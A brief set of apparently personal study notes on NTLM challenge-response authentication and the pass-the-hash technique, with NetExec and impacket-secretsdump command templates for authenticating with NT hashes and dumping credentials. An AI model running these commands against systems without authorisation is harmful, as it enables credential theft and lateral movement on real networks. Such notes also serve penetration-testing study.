**Authentication Flow**
- 1 - Negotiation - login request
- 2 - challenge - server asks requester to encrypt a message to encrypt bytes with the password
- 3 - response - send back encrypted bytes


**Pass the Hash**
NTLMv2 
- with password
	1. nt_hash = NT(pass)
	2. response = HMAC_MD5(nt_hash, server_challenge)
	3. session_key = HMAC_MD5(nt_hash, server_challenge + flags)
- without password (skips first step)
	1. response = HMAC_MD5(nt_hash, server_challenge)
	2. session_key = HMAC_MD5(nt_hash, server_challenge + flags)


**NetExec**
by default, uses NTLM (v2) if nothing else is specified
`nxc smb <IP> -u <user> -H <nt_hash>`

other tools also accept hash, but often require to prepend the LM hash as well
`impacket-secretsdump <user>@<target> -hashes <lm_hash:nt_hash>`


local authentication
`nxc smb <IP> -u <user> -p <pass> --local-auth`
- uses local SAM database, not domain's

